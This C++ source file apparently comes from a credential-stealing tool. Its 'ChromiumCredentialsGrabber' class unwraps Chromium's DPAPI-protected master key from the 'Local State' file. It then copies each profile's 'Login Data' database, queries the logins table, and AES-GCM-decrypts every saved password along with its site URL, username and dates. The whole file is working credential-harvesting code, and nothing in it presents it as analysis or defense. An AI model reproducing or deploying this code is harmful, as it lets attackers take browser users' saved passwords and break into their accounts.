#include "ChromiumCredentialsGrabber.hpp"

#include "Exception.hpp"
#include "Json.hpp"
#include "Trace.hpp"
#include "Crypto/Aes.hpp"
#include "Crypto/Base64.hpp"
#include "Crypto/Protection.hpp"
#include "Filesystem/File.hpp"
#include "Filesystem/TemporaryFile.hpp"
#include "Sql/InMemorySqliteDatabase.hpp"
#include "Sql/SqliteRowIterator.hpp"
#include "Utils/Buffer.hpp"
#include "Utils/Environment.hpp"
#include "Utils/Strings.hpp"

#include <filesystem>

ChromiumCredentialsGrabber::ChromiumCredentialsGrabber(std::filesystem::path app_root):
	CredentialsGrabber(),
	m_app_root(std::move(app_root))
{
}

std::optional<Credentials> ChromiumCredentialsGrabber::grab_credentials() const
{
	if (!exists(m_app_root))
	{
		return {};
	}

	const LocalState local_state = LocalState::from_path(get_local_state_path(m_app_root));
	const auto aes_key = local_state.get_master_key();

	Credentials credentials;

	for (const std::wstring& profile : local_state.get_user_profiles())
	{
		const auto login_data_db = InMemorySqliteDatabase(
			TemporaryFile(get_login_data_path(m_app_root, profile)).read()
		);

		for (SqliteRowIterator iterator = login_data_db.iterate_query(
			     "SELECT origin_url, username_value, password_value, date_created, date_last_used, date_password_modified FROM logins"
		     );
		     iterator.next();)
		{
			const SqliteRow row = iterator.current();
			const auto [origin_url, username_value, password_value, date_created, date_accessed, date_modified] =
				as_tuple<
					std::wstring, std::wstring, Buffer, int64_t, int64_t, int64_t>(
					row
				);

			if (password_value.empty())
			{
				continue;
			}

			auto [iv, encrypted_password] = parse_password(password_value);

			const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);

			credentials.emplace_back(
				origin_url,
				username_value,
				Strings::to_wstring(Strings::to_string(plaintext_password)),
				convert_datetime(date_created),
				convert_datetime(date_accessed),
				convert_datetime(date_modified)
			);
		}
	}

	return credentials;
}

std::tuple<Buffer, Buffer> ChromiumCredentialsGrabber::parse_password(const Buffer& password)
{
	static constexpr std::string_view PREFIX = "v10";
	static constexpr size_t GCM_IV_LENGTH = 12;

	if (password.size() < PREFIX.size() + GCM_IV_LENGTH)
	{
		throw Exception(ErrorCode::INVALID_ARGUMENT);
	}

	const Buffer iv = {password.begin() + PREFIX.size(), password.begin() + PREFIX.size() + GCM_IV_LENGTH};
	const Buffer encrypted_password = {
		password.begin() + PREFIX.size() + GCM_IV_LENGTH,
		password.end()
	};

	return {iv, encrypted_password};
}

std::optional<Time::Datetime> ChromiumCredentialsGrabber::convert_datetime(const int64_t webkit_datetime)
{
	if (webkit_datetime == 0)
	{
		return {};
	}

	return Time::from_webkit_time(webkit_datetime);
}

std::filesystem::path ChromiumCredentialsGrabber::get_user_data_path(const std::filesystem::path& app_root) const
{
	return app_root / "User Data";
}

std::filesystem::path ChromiumCredentialsGrabber::get_local_state_path(const std::filesystem::path& app_root) const
{
	return get_user_data_path(app_root) / L"Local State";
}

std::filesystem::path ChromiumCredentialsGrabber::get_login_data_path(const std::filesystem::path& app_root,
                                                                      const std::wstring& profile) const
{
	return get_user_data_path(app_root) / profile / L"Login Data";
}

ChromiumCredentialsGrabber::LocalState::LocalState(Json local_state):
	m_local_state(std::move(local_state))
{
}

std::vector<std::wstring> ChromiumCredentialsGrabber::LocalState::get_user_profiles() const
{
	const Json profiles_order = m_local_state["profile"]["profiles_order"];
	std::vector<std::wstring> result;
	std::ranges::transform(profiles_order, std::back_inserter(result), get_wstring);
	return result;
}

Buffer ChromiumCredentialsGrabber::LocalState::get_master_key() const
{
	const Buffer key_with_prefix = Base64::decode(m_local_state["os_crypt"]["encrypted_key"].get<std::string>());
	static constexpr std::string_view PREFIX = "DPAPI";

	const Buffer protected_key = {key_with_prefix.begin() + PREFIX.size(), key_with_prefix.end()};
	return Crypto::unprotect_data(protected_key);
}

ChromiumCredentialsGrabber::LocalState ChromiumCredentialsGrabber::LocalState::from_path(
	const std::filesystem::path& local_state_path)
{
	return LocalState(Json::parse(TemporaryFile(local_state_path).read()));
}
